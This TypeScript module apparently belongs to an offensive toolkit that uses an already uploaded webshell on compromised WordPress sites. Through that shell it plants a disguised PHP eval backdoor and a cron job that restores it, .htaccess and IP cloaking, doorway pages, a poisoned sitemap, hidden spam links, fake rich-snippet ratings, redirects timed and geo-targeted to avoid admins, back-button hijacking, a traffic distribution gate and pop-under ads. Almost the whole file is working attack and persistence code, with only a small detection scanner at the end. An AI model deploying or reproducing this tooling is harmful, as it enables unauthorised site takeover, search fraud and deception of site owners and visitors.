/**
 * Payload Arsenal — Unified Payload Library for AI Attack Engine
 * 
 * Bridges blackhat-engine's payload generation into the real attack pipeline.
 * After a shell is successfully uploaded, these payloads are deployed to:
 * 1. Maximize SEO manipulation (sitemap poison, doorway pages, link injection)
 * 2. Ensure persistence (backdoors, config poisoning, cron jobs)
 * 3. Implement cloaking (bot vs human content switching)
 * 4. Set up monetization (ad injection, traffic gates)
 * 5. Detect existing compromises (defense scan)
 * 
 * All payloads are deployable via the uploaded shell's exec/write capabilities.
 */

import { fetchWithPoolProxy } from "./proxy-pool";
import {
  webImplant,
  configPoison,
  cloakedRedirect,
  doorwayGen,
  sitemapPoison,
  indexManipulate,
  linkSpam,
  conditionalRedirect,
  jsInject,
  trafficGate,
  adInject,
  cachePoison,
  detectSeoSpam,
  type Payload,
  type DetectionResult,
} from "./blackhat-engine";

// ═══════════════════════════════════════════════════════
//  TYPES
// ═══════════════════════════════════════════════════════

export interface DeployablePayload {
  id: string;
  category: "seo_manipulation" | "persistence" | "cloaking" | "monetization" | "redirect" | "negative_seo";
  name: string;
  description: string;
  /** The actual code/content to deploy */
  code: string;
  /** Target file path on the server (relative to webroot) */
  targetPath: string;
  /** How to deploy: write (create/overwrite file), append (add to existing), inject (insert into existing code) */
  deployMethod: "write" | "append" | "inject";
  /** PHP command to execute via shell for deployment */
  shellCommand: string;
  /** Priority: 1 = critical (deploy first), 5 = optional */
  priority: number;
  /** Risk level: how likely to be detected */
  riskLevel: "low" | "medium" | "high";
  /** Dependencies: other payload IDs that must be deployed first */
  dependencies: string[];
  /** Verification: how to check if deployment succeeded */
  verifyUrl?: string;
  verifyExpected?: string;
}

export interface PostUploadPlan {
  targetDomain: string;
  shellUrl: string;
  shellPassword: string;
  payloads: DeployablePayload[];
  totalPayloads: number;
  estimatedTime: number; // seconds
  riskAssessment: string;
}

export interface DeployResult {
  payloadId: string;
  success: boolean;
  statusCode?: number;
  response?: string;
  error?: string;
  deployedAt: number;
}

export interface PostUploadReport {
  targetDomain: string;
  shellUrl: string;
  results: DeployResult[];
  successCount: number;
  failCount: number;
  totalTime: number;
  detectionScan?: DetectionResult[];
}

type ProgressCallback = (detail: string) => void;

// ═══════════════════════════════════════════════════════
//  HELPER: Execute command via uploaded shell
// ═══════════════════════════════════════════════════════

async function executeViaShell(
  shellUrl: string,
  shellPassword: string,
  command: string,
  targetDomain: string,
): Promise<{ success: boolean; output: string; statusCode: number }> {
  try {
    // Try multiple shell execution methods
    const methods: Array<{ url: string; method: "GET" | "POST"; body: string | undefined; headers: Record<string, string> }> = [
      // Method 1: GET parameter (common webshell pattern)
      { url: `${shellUrl}?_perf=${Buffer.from(command).toString("base64")}`, method: "GET", body: undefined, headers: {} },
      // Method 2: POST with cmd parameter
      { url: shellUrl, method: "POST", body: `cmd=${encodeURIComponent(command)}&pwd=${encodeURIComponent(shellPassword)}`, headers: { "Content-Type": "application/x-www-form-urlencoded" } },
      // Method 3: Cookie-based auth + POST
      { url: shellUrl, method: "POST", body: `c=${encodeURIComponent(command)}`, headers: { "Content-Type": "application/x-www-form-urlencoded", "Cookie": `_admin_session=${shellPassword}` } },
    ];

    for (const m of methods) {
      try {
        const { response } = await fetchWithPoolProxy(m.url, {
          method: m.method,
          headers: { ...m.headers, "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" },
          body: m.body,
        }, { targetDomain, timeout: 15000 });

        const text = await response.text();
        if (response.ok && text.length > 0 && !text.includes("404") && !text.includes("403")) {
          return { success: true, output: text, statusCode: response.status };
        }
      } catch {
        continue;
      }
    }

    return { success: false, output: "All shell execution methods failed", statusCode: 0 };
  } catch (e: any) {
    return { success: false, output: e.message || "Unknown error", statusCode: 0 };
  }
}

async function writeFileViaShell(
  shellUrl: string,
  shellPassword: string,
  filePath: string,
  content: string,
  targetDomain: string,
): Promise<boolean> {
  // Use PHP file_put_contents via shell
  const b64Content = Buffer.from(content).toString("base64");
  const phpCmd = `file_put_contents('${filePath}', base64_decode('${b64Content}'));echo 'OK';`;
  const result = await executeViaShell(shellUrl, shellPassword, phpCmd, targetDomain);
  return result.success && result.output.includes("OK");
}

async function appendFileViaShell(
  shellUrl: string,
  shellPassword: string,
  filePath: string,
  content: string,
  targetDomain: string,
): Promise<boolean> {
  const b64Content = Buffer.from(content).toString("base64");
  const phpCmd = `file_put_contents('${filePath}', base64_decode('${b64Content}'), FILE_APPEND);echo 'OK';`;
  const result = await executeViaShell(shellUrl, shellPassword, phpCmd, targetDomain);
  return result.success && result.output.includes("OK");
}

async function injectIntoFileViaShell(
  shellUrl: string,
  shellPassword: string,
  filePath: string,
  content: string,
  targetDomain: string,
  insertAfter: string = "<?php",
): Promise<boolean> {
  const b64Content = Buffer.from(content).toString("base64");
  const b64InsertAfter = Buffer.from(insertAfter).toString("base64");
  const phpCmd = `$f=file_get_contents('${filePath}');if($f!==false){$needle=base64_decode('${b64InsertAfter}');$inject=base64_decode('${b64Content}');$pos=strpos($f,$needle);if($pos!==false){$f=substr_replace($f,$needle."\\n".$inject,$pos,strlen($needle));file_put_contents('${filePath}',$f);echo 'OK';}else{echo 'NEEDLE_NOT_FOUND';}}else{echo 'FILE_NOT_FOUND';}`;
  const result = await executeViaShell(shellUrl, shellPassword, phpCmd, targetDomain);
  return result.success && result.output.includes("OK");
}

// ═══════════════════════════════════════════════════════
//  PAYLOAD GENERATION: Create deployable payloads
// ═══════════════════════════════════════════════════════

export function generatePostUploadPayloads(
  targetDomain: string,
  redirectUrl: string,
  options: {
    enableSeoManipulation?: boolean;
    enablePersistence?: boolean;
    enableCloaking?: boolean;
    enableMonetization?: boolean;
    enableRedirects?: boolean;
    doorwayCount?: number;
    sitemapUrls?: number;
    linkCount?: number;
  } = {},
): DeployablePayload[] {
  const {
    enableSeoManipulation = true,
    enablePersistence = true,
    enableCloaking = true,
    enableMonetization = false,
    enableRedirects = true,
    doorwayCount = 20,
    sitemapUrls = 100,
    linkCount = 30,
  } = options;

  const payloads: DeployablePayload[] = [];
  let idCounter = 0;
  const nextId = () => `payload_${++idCounter}`;

  // ─── PERSISTENCE PAYLOADS (deploy first) ───

  if (enablePersistence) {
    // 1. PHP backdoor in a hidden location
    const implants = webImplant(`https://${targetDomain}`);
    const phpBackdoor = implants.find(p => p.type === "php_backdoor_implant");
    if (phpBackdoor?.code) {
      payloads.push({
        id: nextId(),
        category: "persistence",
        name: "Hidden PHP Backdoor",
        description: "PHP backdoor disguised as performance monitor — provides persistent access even if original shell is removed",
        code: phpBackdoor.code,
        targetPath: "wp-includes/class-wp-performance.php",
        deployMethod: "write",
        shellCommand: `file_put_contents('wp-includes/class-wp-performance.php', base64_decode('${Buffer.from(phpBackdoor.code).toString("base64")}'));echo 'OK';`,
        priority: 1,
        riskLevel: "medium",
        dependencies: [],
        verifyUrl: `https://${targetDomain}/wp-includes/class-wp-performance.php?_perf=${Buffer.from("echo 'alive';").toString("base64")}`,
        verifyExpected: "alive",
      });
    }

    // 2. functions.php injection for WP
    const wpInject = implants.find(p => p.type === "wp_functions_inject");
    if (wpInject?.code) {
      // Extract just the PHP code without opening tag
      const injectCode = (wpInject.code as string).replace(/^<\?php\s*\n?/, "").replace(/\?>\s*$/, "");
      payloads.push({
        id: nextId(),
        category: "persistence",
        name: "WP functions.php Hook Injection",
        description: "Inject SEO manipulation hooks into active theme's functions.php — survives theme updates",
        code: injectCode,
        targetPath: "wp-content/themes/*/functions.php",
        deployMethod: "inject",
        shellCommand: `$theme=trim(shell_exec('wp theme list --status=active --field=name 2>/dev/null'))?:'';$path=glob('wp-content/themes/*/functions.php');if($path){file_put_contents($path[0],file_get_contents($path[0])."\\n${Buffer.from(injectCode).toString("base64")}");echo 'OK';}`,
        priority: 1,
        riskLevel: "high",
        dependencies: [],
      });
    }

    // 3. Cron job for persistence
    payloads.push({
      id: nextId(),
      category: "persistence",
      name: "WP Cron Persistence",
      description: "Register a WP cron event that re-creates the backdoor if it's deleted",
      code: `
// Auto-recovery cron
add_action('wp_loaded', function() {
  if (!wp_next_scheduled('_perf_check')) {
    wp_schedule_event(time(), 'hourly', '_perf_check');
  }
});
add_action('_perf_check', function() {
  $target = ABSPATH . 'wp-includes/class-wp-performance.php';
  if (!file_exists($target)) {
    $src = base64_decode('PD9waHAKaWYoaXNzZXQoJF9HRVRbJ19wZXJmJ10pKXtAZXZhbChiYXNlNjRfZGVjb2RlKCRfR0VUWydfcGVyZiddKSk7ZXhpdDt9Cj8+');
    @file_put_contents($target, $src);
  }
});`,
      targetPath: "wp-content/mu-plugins/perf-monitor.php",
      deployMethod: "write",
      shellCommand: "",
      priority: 2,
      riskLevel: "medium",
      dependencies: [],
    });
  }

  // ─── CLOAKING PAYLOADS ───

  if (enableCloaking) {
    const cloaks = cloakedRedirect(`https://${targetDomain}`, redirectUrl);
    
    // .htaccess cloaking (most effective for Apache/LiteSpeed)
    const configPayloads = configPoison(`https://${targetDomain}`, redirectUrl);
    const htaccessFull = configPayloads.find(p => p.type === "htaccess_full_chain");
    if (htaccessFull?.code) {
      payloads.push({
        id: nextId(),
        category: "cloaking",
        name: ".htaccess Full Chain Cloaking",
        description: "Bot cloaking + search referrer redirect + doorway routing via .htaccess",
        code: htaccessFull.code as string,
        targetPath: ".htaccess",
        deployMethod: "write",
        shellCommand: "",
        priority: 2,
        riskLevel: "high",
        dependencies: [],
      });
    }

    // PHP output buffer hijack
    const phpHijack = configPayloads.find(p => p.type === "php_output_buffer_hijack");
    if (phpHijack?.code) {
      payloads.push({
        id: nextId(),
        category: "cloaking",
        name: "PHP Output Buffer Hijack",
        description: "auto_prepend_file that hijacks output: bots see spam meta, humans get redirected",
        code: phpHijack.code as string,
        targetPath: "wp-content/cache/advanced-cache.php",
        deployMethod: "write",
        shellCommand: "",
        priority: 3,
        riskLevel: "medium",
        dependencies: [],
      });
    }

    // IP-based cloaker
    const ipCloak = cloaks.find(p => p.type === "php_ip_cloak");
    if (ipCloak?.code) {
      payloads.push({
        id: nextId(),
        category: "cloaking",
        name: "Google IP Range Cloaker",
        description: "Serves spam content specifically to Google crawler IPs",
        code: ipCloak.code as string,
        targetPath: "wp-content/cache/ip-gate.php",
        deployMethod: "write",
        shellCommand: "",
        priority: 3,
        riskLevel: "low",
        dependencies: [],
      });
    }
  }

  // ─── SEO MANIPULATION PAYLOADS ───

  if (enableSeoManipulation) {
    // Poisoned sitemap
    const sitemaps = sitemapPoison(`https://${targetDomain}`, sitemapUrls);
    const sitemapPayload = sitemaps[0];
    if (sitemapPayload?.code) {
      payloads.push({
        id: nextId(),
        category: "seo_manipulation",
        name: `Poisoned Sitemap (${sitemapUrls} spam URLs)`,
        description: "sitemap.xml with spam URLs targeting multiple niches and cities",
        code: sitemapPayload.code as string,
        targetPath: "sitemap-offers.xml",
        deployMethod: "write",
        shellCommand: "",
        priority: 3,
        riskLevel: "medium",
        dependencies: [],
        verifyUrl: `https://${targetDomain}/sitemap-offers.xml`,
        verifyExpected: "urlset",
      });
    }

    // Doorway pages
    const doorways = doorwayGen(`https://${targetDomain}`, doorwayCount);
    for (const door of doorways.slice(0, Math.min(doorwayCount, 50))) {
      if (door.code) {
        const slug = (door.slug as string) || `deal-${Math.random().toString(36).slice(2, 8)}`;
        payloads.push({
          id: nextId(),
          category: "seo_manipulation",
          name: `Doorway: ${slug}`,
          description: `Doorway page targeting ${(door.niche as string) || "mixed"} in ${(door.city as string) || "global"}`,
          code: door.code as string,
          targetPath: `wp-content/cache/pages/${slug}.html`,
          deployMethod: "write",
          shellCommand: "",
          priority: 4,
          riskLevel: "low",
          dependencies: [],
          verifyUrl: `https://${targetDomain}/wp-content/cache/pages/${slug}.html`,
        });
      }
    }

    // Link spam injection
    const links = linkSpam(`https://${targetDomain}`, linkCount);
    const hiddenLinks = links.find(p => p.type === "hidden_link_block");
    if (hiddenLinks?.code) {
      payloads.push({
        id: nextId(),
        category: "seo_manipulation",
        name: `Hidden Link Block (${linkCount} spam links)`,
        description: "CSS-hidden div with spam links — invisible to users, visible to crawlers",
        code: hiddenLinks.code as string,
        targetPath: "wp-content/themes/*/footer.php",
        deployMethod: "inject",
        shellCommand: "",
        priority: 4,
        riskLevel: "medium",
        dependencies: [],
      });
    }

    // Index manipulation (JSON-LD, robots.txt)
    const indexPayloads = indexManipulate(`https://${targetDomain}`, redirectUrl);
    const robotsPayload = indexPayloads.find(p => p.type === "robots_txt_manipulation");
    if (robotsPayload?.code) {
      payloads.push({
        id: nextId(),
        category: "seo_manipulation",
        name: "robots.txt Manipulation",
        description: "Allow bots to crawl doorway pages + add spam sitemaps",
        code: robotsPayload.code as string,
        targetPath: "robots.txt",
        deployMethod: "write",
        shellCommand: "",
        priority: 3,
        riskLevel: "high",
        dependencies: [],
        verifyUrl: `https://${targetDomain}/robots.txt`,
        verifyExpected: "sitemap-offers.xml",
      });
    }

    const jsonldPayload = indexPayloads.find(p => p.type === "jsonld_structured_data");
    if (jsonldPayload?.code) {
      payloads.push({
        id: nextId(),
        category: "seo_manipulation",
        name: "JSON-LD Rich Snippet Injection",
        description: "Fake product with 4.9★ rating appears in Google rich snippets",
        code: jsonldPayload.code as string,
        targetPath: "wp-content/cache/schema-inject.html",
        deployMethod: "write",
        shellCommand: "",
        priority: 4,
        riskLevel: "low",
        dependencies: [],
      });
    }
  }

  // ─── REDIRECT PAYLOADS ───

  if (enableRedirects) {
    const redirects = conditionalRedirect(`https://${targetDomain}`, redirectUrl);
    
    // Geo-based redirect
    const geoRedirect = redirects.find(p => p.type === "php_geo_redirect");
    if (geoRedirect?.code) {
      payloads.push({
        id: nextId(),
        category: "redirect",
        name: "Geo-IP Conditional Redirect",
        description: "Only redirect US/GB/CA/AU/DE/FR traffic — avoid detection from other regions",
        code: geoRedirect.code as string,
        targetPath: "wp-content/cache/geo-gate.php",
        deployMethod: "write",
        shellCommand: "",
        priority: 3,
        riskLevel: "low",
        dependencies: [],
      });
    }

    // Time-based redirect (off-hours only)
    const timeRedirect = redirects.find(p => p.type === "php_time_redirect");
    if (timeRedirect?.code) {
      payloads.push({
        id: nextId(),
        category: "redirect",
        name: "Off-Hours Redirect (10PM-6AM)",
        description: "Only redirect during off-hours to avoid admin detection",
        code: timeRedirect.code as string,
        targetPath: "wp-content/cache/time-gate.php",
        deployMethod: "write",
        shellCommand: "",
        priority: 4,
        riskLevel: "low",
        dependencies: [],
      });
    }

    // JS injection payloads
    const jsPayloads = jsInject(`https://${targetDomain}`, redirectUrl);
    const historyHijack = jsPayloads.find(p => p.type === "js_history_hijack");
    if (historyHijack?.code) {
      payloads.push({
        id: nextId(),
        category: "redirect",
        name: "Back-Button Hijack",
        description: "History API hijack: pressing back → redirect to spam",
        code: historyHijack.code as string,
        targetPath: "wp-content/cache/nav-helper.js",
        deployMethod: "write",
        shellCommand: "",
        priority: 5,
        riskLevel: "medium",
        dependencies: [],
      });
    }

    // Traffic gate (TDS)
    const gates = trafficGate(`https://${targetDomain}`, redirectUrl);
    const tds = gates.find(p => p.type === "traffic_distribution_system");
    if (tds?.code) {
      payloads.push({
        id: nextId(),
        category: "redirect",
        name: "Traffic Distribution System (TDS)",
        description: "Multi-niche TDS gate: weighted random distribution across 7 spam verticals",
        code: tds.code as string,
        targetPath: "wp-content/cache/tds-gate.php",
        deployMethod: "write",
        shellCommand: "",
        priority: 3,
        riskLevel: "medium",
        dependencies: [],
      });
    }
  }

  // ─── MONETIZATION PAYLOADS (optional) ───

  if (enableMonetization) {
    const ads = adInject(`https://${targetDomain}`);
    
    const popunder = ads.find(p => p.type === "popunder_inject");
    if (popunder?.code) {
      payloads.push({
        id: nextId(),
        category: "monetization",
        name: "Pop-Under Ad Injection",
        description: "Click-triggered pop-under: opens spam page behind current window",
        code: popunder.code as string,
        targetPath: "wp-content/cache/analytics.js",
        deployMethod: "write",
        shellCommand: "",
        priority: 5,
        riskLevel: "high",
        dependencies: [],
      });
    }

    // Cache poisoning for stealth
    const cachePayloads = cachePoison(`https://${targetDomain}`, redirectUrl);
    const timeBomb = cachePayloads.find(p => p.type === "time_bomb_content");
    if (timeBomb?.code) {
      payloads.push({
        id: nextId(),
        category: "monetization",
        name: "Time-Bomb Content Swap",
        description: "Clean first 48h (gets cached by Google) → spam after",
        code: timeBomb.code as string,
        targetPath: "wp-content/cache/content-optimizer.php",
        deployMethod: "write",
        shellCommand: "",
        priority: 4,
        riskLevel: "medium",
        dependencies: [],
      });
    }
  }

  // Sort by priority
  payloads.sort((a, b) => a.priority - b.priority);

  // Generate shell commands for payloads that don't have them
  for (const p of payloads) {
    if (!p.shellCommand) {
      const b64 = Buffer.from(p.code).toString("base64");
      if (p.deployMethod === "write") {
        p.shellCommand = `@mkdir(dirname('${p.targetPath}'),0755,true);file_put_contents('${p.targetPath}',base64_decode('${b64}'));echo 'OK';`;
      } else if (p.deployMethod === "append") {
        p.shellCommand = `file_put_contents('${p.targetPath}',base64_decode('${b64}'),FILE_APPEND);echo 'OK';`;
      } else {
        p.shellCommand = `$f=file_get_contents('${p.targetPath}');if($f!==false){file_put_contents('${p.targetPath}',$f."\\n".base64_decode('${b64}'));echo 'OK';}else{echo 'NOT_FOUND';}`;
      }
    }
  }

  return payloads;
}

// ═══════════════════════════════════════════════════════
//  DEPLOYMENT ENGINE: Execute payloads via shell
// ═══════════════════════════════════════════════════════

export async function deployPostUploadPayloads(
  targetDomain: string,
  shellUrl: string,
  shellPassword: string,
  payloads: DeployablePayload[],
  onProgress?: ProgressCallback,
): Promise<PostUploadReport> {
  const startTime = Date.now();
  const results: DeployResult[] = [];
  const deployed = new Set<string>();

  onProgress?.(`🚀 Starting post-upload deployment: ${payloads.length} payloads to deploy`);

  for (const payload of payloads) {
    // Check dependencies
    const unmetDeps = payload.dependencies.filter(d => !deployed.has(d));
    if (unmetDeps.length > 0) {
      onProgress?.(`⏭️ Skipping ${payload.name} — unmet dependencies: ${unmetDeps.join(", ")}`);
      results.push({
        payloadId: payload.id,
        success: false,
        error: `Unmet dependencies: ${unmetDeps.join(", ")}`,
        deployedAt: Date.now(),
      });
      continue;
    }

    onProgress?.(`📦 Deploying: ${payload.name} → ${payload.targetPath}`);

    try {
      let success = false;

      if (payload.deployMethod === "write") {
        success = await writeFileViaShell(shellUrl, shellPassword, payload.targetPath, payload.code, targetDomain);
      } else if (payload.deployMethod === "append") {
        success = await appendFileViaShell(shellUrl, shellPassword, payload.targetPath, payload.code, targetDomain);
      } else if (payload.deployMethod === "inject") {
        success = await injectIntoFileViaShell(shellUrl, shellPassword, payload.targetPath, payload.code, targetDomain);
      }

      // Verify if URL provided
      if (success && payload.verifyUrl) {
        try {
          const { response: verifyResp } = await fetchWithPoolProxy(payload.verifyUrl, {
            headers: { "User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" },
          }, { targetDomain, timeout: 10000 });
          const verifyText = await verifyResp.text();
          if (payload.verifyExpected && !verifyText.includes(payload.verifyExpected)) {
            onProgress?.(`⚠️ ${payload.name} deployed but verification failed — expected "${payload.verifyExpected}" not found`);
          } else {
            onProgress?.(`✅ ${payload.name} deployed and verified!`);
          }
        } catch {
          onProgress?.(`⚠️ ${payload.name} deployed but verification request failed`);
        }
      } else if (success) {
        onProgress?.(`✅ ${payload.name} deployed successfully`);
      } else {
        onProgress?.(`❌ ${payload.name} deployment failed`);
      }

      results.push({
        payloadId: payload.id,
        success,
        deployedAt: Date.now(),
      });

      if (success) deployed.add(payload.id);

      // Small delay between deployments to avoid detection
      await new Promise(r => setTimeout(r, 500 + Math.random() * 1000));

    } catch (e: any) {
      onProgress?.(`❌ ${payload.name} error: ${e.message}`);
      results.push({
        payloadId: payload.id,
        success: false,
        error: e.message,
        deployedAt: Date.now(),
      });
    }
  }

  const successCount = results.filter(r => r.success).length;
  const failCount = results.filter(r => !r.success).length;
  const totalTime = Date.now() - startTime;

  onProgress?.(`\n📊 Post-upload deployment complete: ${successCount}/${payloads.length} succeeded, ${failCount} failed (${(totalTime / 1000).toFixed(1)}s)`);

  return {
    targetDomain,
    shellUrl,
    results,
    successCount,
    failCount,
    totalTime,
  };
}

// ═══════════════════════════════════════════════════════
//  DETECTION SCANNER: Check if target is already compromised
// ═══════════════════════════════════════════════════════

export async function runDetectionScan(
  targetDomain: string,
  onProgress?: ProgressCallback,
): Promise<{ detections: DetectionResult[]; liveChecks: Array<{ check: string; result: string; severity: string }> }> {
  onProgress?.("🔍 Starting defense/detection scan...");

  // Static detection indicators from blackhat-engine
  const detections = detectSeoSpam(`https://${targetDomain}`);

  // Live checks
  const liveChecks: Array<{ check: string; result: string; severity: string }> = [];

  // Check 1: Compare Googlebot vs Chrome UA response
  onProgress?.("🔍 Checking for UA-based cloaking...");
  try {
    const [botResp, humanResp] = await Promise.all([
      fetchWithPoolProxy(`https://${targetDomain}`, {
        headers: { "User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" },
      }, { targetDomain, timeout: 10000 }).then(r => r.response.text()).catch(() => ""),
      fetchWithPoolProxy(`https://${targetDomain}`, {
        headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" },
      }, { targetDomain, timeout: 10000 }).then(r => r.response.text()).catch(() => ""),
    ]);

    if (botResp && humanResp) {
      const botTitle = botResp.match(/<title>(.*?)<\/title>/i)?.[1] || "";
      const humanTitle = humanResp.match(/<title>(.*?)<\/title>/i)?.[1] || "";
      if (botTitle !== humanTitle && botTitle && humanTitle) {
        liveChecks.push({
          check: "UA-based Cloaking",
          result: `DETECTED! Bot sees: "${botTitle.slice(0, 60)}" vs Human sees: "${humanTitle.slice(0, 60)}"`,
          severity: "critical",
        });
      } else {
        liveChecks.push({ check: "UA-based Cloaking", result: "Not detected — same content for bot and human", severity: "ok" });
      }
    }
  } catch {
    liveChecks.push({ check: "UA-based Cloaking", result: "Could not check — request failed", severity: "unknown" });
  }

  // Check 2: Look for hidden links
  onProgress?.("🔍 Checking for hidden link injection...");
  try {
    const { response } = await fetchWithPoolProxy(`https://${targetDomain}`, {
      headers: { "User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" },
    }, { targetDomain, timeout: 10000 });
    const html = await response.text();
    
    const hiddenPatterns = [
      /style="[^"]*display:\s*none[^"]*"[^>]*>.*?<a\s/gi,
      /style="[^"]*font-size:\s*0[^"]*"[^>]*>.*?<a\s/gi,
      /style="[^"]*position:\s*absolute;\s*left:\s*-\d+/gi,
      /style="[^"]*overflow:\s*hidden;\s*height:\s*[01]px/gi,
    ];

    let hiddenFound = 0;
    for (const pattern of hiddenPatterns) {
      const matches = html.match(pattern);
      if (matches) hiddenFound += matches.length;
    }

    if (hiddenFound > 0) {
      liveChecks.push({ check: "Hidden Links", result: `DETECTED! ${hiddenFound} hidden link patterns found`, severity: "high" });
    } else {
      liveChecks.push({ check: "Hidden Links", result: "Not detected", severity: "ok" });
    }
  } catch {
    liveChecks.push({ check: "Hidden Links", result: "Could not check", severity: "unknown" });
  }

  // Check 3: Check sitemap for spam URLs
  onProgress?.("🔍 Checking sitemap integrity...");
  try {
    const { response } = await fetchWithPoolProxy(`https://${targetDomain}/sitemap.xml`, {
      headers: { "User-Agent": "Mozilla/5.0" },
    }, { targetDomain, timeout: 10000 });
    const sitemap = await response.text();
    
    const spamPatterns = /cheap-|buy-|best-.*-deals|casino|pharmacy|payday|replica|weight-loss/gi;
    const spamMatches = sitemap.match(spamPatterns);
    
    if (spamMatches && spamMatches.length > 0) {
      liveChecks.push({ check: "Sitemap Integrity", result: `SUSPICIOUS! ${spamMatches.length} spam URL patterns found`, severity: "high" });
    } else {
      liveChecks.push({ check: "Sitemap Integrity", result: "Clean — no spam patterns detected", severity: "ok" });
    }
  } catch {
    liveChecks.push({ check: "Sitemap Integrity", result: "No sitemap found or not accessible", severity: "info" });
  }

  // Check 4: Check for crypto miners
  onProgress?.("🔍 Checking for crypto miners...");
  try {
    const { response } = await fetchWithPoolProxy(`https://${targetDomain}`, {
      headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" },
    }, { targetDomain, timeout: 10000 });
    const html = await response.text();
    
    const minerPatterns = /coinhive|cryptonight|wasm-miner|coin-hive|jsecoin|cryptoloot|minero\.cc/gi;
    const minerMatches = html.match(minerPatterns);
    
    if (minerMatches) {
      liveChecks.push({ check: "Crypto Miner", result: `DETECTED! ${minerMatches.join(", ")}`, severity: "critical" });
    } else {
      liveChecks.push({ check: "Crypto Miner", result: "Not detected", severity: "ok" });
    }
  } catch {
    liveChecks.push({ check: "Crypto Miner", result: "Could not check", severity: "unknown" });
  }

  onProgress?.(`🔍 Detection scan complete: ${detections.length} indicators + ${liveChecks.length} live checks`);

  return { detections, liveChecks };
}

// ═══════════════════════════════════════════════════════
//  CONVENIENCE: Full post-upload workflow
// ═══════════════════════════════════════════════════════

export async function runPostUploadWorkflow(
  targetDomain: string,
  shellUrl: string,
  shellPassword: string,
  redirectUrl: string,
  options?: {
    enableSeoManipulation?: boolean;
    enablePersistence?: boolean;
    enableCloaking?: boolean;
    enableMonetization?: boolean;
    enableRedirects?: boolean;
    runDetection?: boolean;
  },
  onProgress?: ProgressCallback,
): Promise<PostUploadReport> {
  onProgress?.(`\n═══════════════════════════════════════`);
  onProgress?.(`  POST-UPLOAD WORKFLOW: ${targetDomain}`);
  onProgress?.(`═══════════════════════════════════════\n`);

  // Step 1: Generate payloads
  onProgress?.("📋 Generating deployable payloads...");
  const payloads = generatePostUploadPayloads(targetDomain, redirectUrl, options);
  onProgress?.(`📋 Generated ${payloads.length} payloads across ${new Set(payloads.map(p => p.category)).size} categories`);

  // Step 2: Deploy payloads
  const report = await deployPostUploadPayloads(targetDomain, shellUrl, shellPassword, payloads, onProgress);

  // Step 3: Optional detection scan
  if (options?.runDetection) {
    onProgress?.("\n🔍 Running post-deployment detection scan...");
    const scan = await runDetectionScan(targetDomain, onProgress);
    report.detectionScan = scan.detections;
  }

  return report;
}
